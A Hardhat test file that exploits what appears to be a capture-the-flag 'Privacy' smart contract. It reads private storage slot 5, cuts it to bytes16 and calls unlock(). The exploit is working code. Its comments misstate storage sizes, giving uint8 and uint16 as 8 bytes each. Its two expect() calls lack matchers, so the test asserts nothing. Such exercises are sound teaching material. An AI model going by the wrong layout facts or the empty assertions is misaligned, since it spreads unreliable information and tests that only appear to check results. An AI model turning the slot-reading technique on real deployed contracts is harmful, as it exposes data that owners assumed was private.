import { isBigNumberish } from "@ethersproject/bignumber/lib/bignumber"
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { assert, expect } from "chai"
import { ethers, network, deployments } from "hardhat"
import { Address } from "hardhat-deploy/dist/types"
import { developmentChains, networkConfig } from "../../helper-hardhat-config"
import { Privacy } from "../../typechain-types"

!developmentChains.includes(network.name)
    ? describe.skip
    : describe("Privacy Exploit Testing", () => {
          let privacy: Privacy
          let exploiter: SignerWithAddress
          // run before test cases
          before(async () => {
              await deployments.fixture(["privacy"])
              privacy = await ethers.getContract("Privacy")
              const accounts = await ethers.getSigners()
              exploiter = accounts[0]
          })

          it("privacy exploit", async () => {
              //key to hack this is to know how storage is aligned

              //**This is how data is storea */
              // bool public locked = true;  ** takes 1 Byte storage ** - slot 0
              // uint256 public ID = block.timestamp; ** takes 32 bytes storage ** - slot 1
              // uint8 private flattening = 10; - **takes 8bytes** - slot 2
              // uint8 private denomination = 255; - ** takes 8 bytes** - slot 2
              // uint16 private awkwardness = uint16(block.timestamp); - ** takes 8 bytes ** - slot 2
              // bytes32[3] private data; - **this goes to slot 3, slot 4, slot 5**

              // since data[2] is the key to unlock the Privacy contract
              // we are looking for data stored in storage location 5

              // copying below from solidity storage in Privacy.sol

              const key = await ethers.provider.getStorageAt(privacy.address, 5)
              const bytes16Key = key.slice(0, 34) // first 2 bytes ar `0x` -> include them in bytes16
              expect(await privacy.locked(), "privacy locked before exploit")
              const unlock = await privacy.connect(exploiter).unlock(bytes16Key)
              expect(!(await privacy.locked()), "privacy unlocked after exploit")
          })
      })
